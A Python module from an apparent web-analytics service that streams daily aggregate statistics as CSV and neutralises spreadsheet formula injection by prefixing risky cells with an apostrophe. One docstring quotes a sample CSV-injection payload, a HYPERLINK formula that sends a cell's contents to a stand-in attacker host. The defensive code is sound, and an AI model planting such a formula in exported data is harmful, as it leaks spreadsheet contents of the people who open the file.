"""Streaming CSV export of a site's aggregates.

The rows are the daily grain the dashboard is built on, which is everything the
service knows about a site once the raw events have aged out. Exporting that
rather than raw events means the file is bounded by days times dimensions
rather than by traffic, and it is the same data whether or not retention has
run.

Streamed a chunk at a time. Building the whole file in memory would make a busy
site's export a way to run the process out of it.
"""

import csv
import io
from collections.abc import Iterator
from typing import Any

from sqlalchemy import select
from sqlalchemy.orm import sessionmaker

from app.models import DailyStat
from app.services.timeranges import TimeRange

# Every measure on the daily grain, not a subset of it. Revenue especially:
# once retention has purged the raw events the aggregates are the only copy
# there is, and this file is the way out of the system. Bounces and revenue are
# zero on a breakdown row, which is the honest answer -- a single source has no
# bounce rate of its own, and money that dimension did not take is not money.
COLUMNS = ("day", "dimension", "value", "visitors", "pageviews", "bounces", "revenue_minor")

# Rows fetched from the database per round trip.
CHUNK = 1_000


# Characters a spreadsheet reads as the start of a formula rather than as text.
# Tab and carriage return are in the list because some importers strip them and
# then act on whatever was behind them.
FORMULA_LEAD = ("=", "+", "-", "@", "\t", "\r")


def _defused(value: Any) -> Any:
    """Stop a cell from being executed by the program that opens this file.

    Every dimension value in this export is chosen by a visitor. A campaign tag
    of ``=HYPERLINK("http://evil.test/?"&A1,"sale")`` needs no access beyond
    loading a page on the site being measured -- it survives every gate the
    collector has, because the URL carrying it really is on that site -- and
    then waits in the analytics until the owner opens their export, where it
    runs as them. Quoting does not help: Excel strips the quotes and runs it
    anyway, which is why ``csv.writer`` alone was never enough.

    An apostrophe is Excel's own marker for "this cell is text". It consumes it
    and shows the original, so the person the file is for sees what the visitor
    actually sent. A plain reader keeps the extra character, which is the
    cheaper of the two costs by a distance.

    Numbers are left alone: they cannot lead with one of these, and a stray
    apostrophe would turn a count into a string for every reader downstream.
    """
    if isinstance(value, str) and value.startswith(FORMULA_LEAD):
        return f"'{value}"
    return value


class _Line:
    """csv.writer needs a file; this hands back one row at a time instead.

    Going through the csv module rather than joining with commas is not
    ceremony: a pathname can contain a comma or a quote, and hand-rolled CSV is
    how an export quietly corrupts itself.
    """

    def __init__(self) -> None:
        self._buffer = io.StringIO()
        self._writer = csv.writer(self._buffer, lineterminator="\n")

    def of(self, values: Any) -> str:
        self._writer.writerow([_defused(v) for v in values])
        line = self._buffer.getvalue()
        self._buffer.seek(0)
        self._buffer.truncate(0)
        return line


def filename_for(site_id: str, time_range: TimeRange) -> str:
    start, end = time_range.days
    return f"beacon-{site_id}-{start.isoformat()}-to-{end.isoformat()}.csv"


def daily_stats_csv(
    sessions: sessionmaker[Any], *, site_id: str, time_range: TimeRange
) -> Iterator[str]:
    """Yield the export one line at a time.

    Opens its own session rather than borrowing the request's: the generator
    outlives the handler that returned it, and a session torn down mid-stream
    would fail somewhere no one is looking.
    """
    line = _Line()
    yield line.of(COLUMNS)

    first, last = time_range.days
    statement = (
        select(
            DailyStat.day,
            DailyStat.dimension,
            DailyStat.value,
            DailyStat.visitors,
            DailyStat.pageviews,
            DailyStat.bounces,
            DailyStat.revenue_minor,
        )
        .where(
            DailyStat.site_id == site_id,
            DailyStat.day >= first,
            DailyStat.day <= last,
        )
        .order_by(DailyStat.day, DailyStat.dimension, DailyStat.value)
    )

    with sessions() as session:
        for row in session.execute(statement).yield_per(CHUNK):
            yield line.of((row.day.isoformat(), *row[1:]))
